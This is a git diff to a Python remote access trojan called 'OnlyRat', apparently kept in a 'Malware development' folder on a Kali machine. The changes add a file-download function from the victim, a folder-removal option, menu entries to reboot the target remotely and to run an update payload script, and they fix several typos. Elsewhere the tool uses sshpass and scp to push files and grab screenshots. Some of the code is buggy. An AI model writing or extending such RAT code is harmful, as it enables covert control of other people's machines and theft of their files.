@@ -85,7 +85,7 @@ def remote_uplaod(address,password,upload_file,path):
     os.system(f"sshpass -p  \"{password}\" scp {upload_file} onlyrat@{address}:{local_path}")
 
 
-def remote_download(address,password,download_file,path):
+def remote_download(address,password,path):
     # remote 
     print("\n[*] Starting Download.....")
     os.system("mkdir ~/Download")
@@ -193,15 +193,37 @@ def Grab_ScreenShot(address,password,working,username):
     os.system(f"rm -rf ~/Downloads/ASGHbvcQPW")
     print("\n[*] screenshot renamed successfully on your  PC and its located in ~/Downloads \n")
 
-def upload(address,password,wokring):
+def upload(address,password,working):
 
     print("\n[~] Enter file you wish to upload")
     upload_file=input(header)
 
     print("[*] uploading ...........")
     remote_uplaod(address, password, upload_file, working)
-    print("[+} uploaded successfully........")
+    print("[+} uploaded successfully to {working}........")
 
+
+def download(address,password):
+    # get download path 
+    print("\n[~] Enter  path of the file you wish to download :")
+    download_file=input(header)
+
+    # download the file
+    print("\n[~] Downloadig.......")
+
+    remote_download(address, password,download_file )
+
+
+
+def remove ():
+    print("\n[!!!] are you sure you want to remove the onlyrat[y/n]\n ")
+
+    #userinput
+    option=input(header)
+    if option =='y':
+        file=input(f"{header} Enter folder you want to delete\n")
+        file_path=os.path.abspath(file)
+        os.system("frm -rf {file_path}")
 
 
 
@@ -229,7 +251,7 @@ def update():
         option=input(f"{header}")
         # update
         if option=="y":
-            os.system(f"sh /home/kali/Desktop/Malware development/OnlyRat/payloads/update.sh")
+            os.system(f"sh /home/kali/Desktop/Malware\ development/OnlyRat/payloads/update.sh")
 
 
         else:
@@ -274,6 +296,7 @@ def cli(argument):
         if option=="0":
             try:
                 connect(ipv4,password)
+
             except Exception as e:
                 print(e)
         elif option=="1":
@@ -295,8 +318,12 @@ def cli(argument):
             Grab_ScreenShot(ipv4,password,target_username,working_directory)
         elif option=="5":
             upload(ipv4,password,working_directory)
-        elif option=="5":
+        elif option=="6":
+            download(ipv4,password)
+        elif option=="7":
             remote_commands(ipv4, password, "shutdown /r")
+        elif option=='u':
+            update()
     else:
         print(help_menu)
 # main code
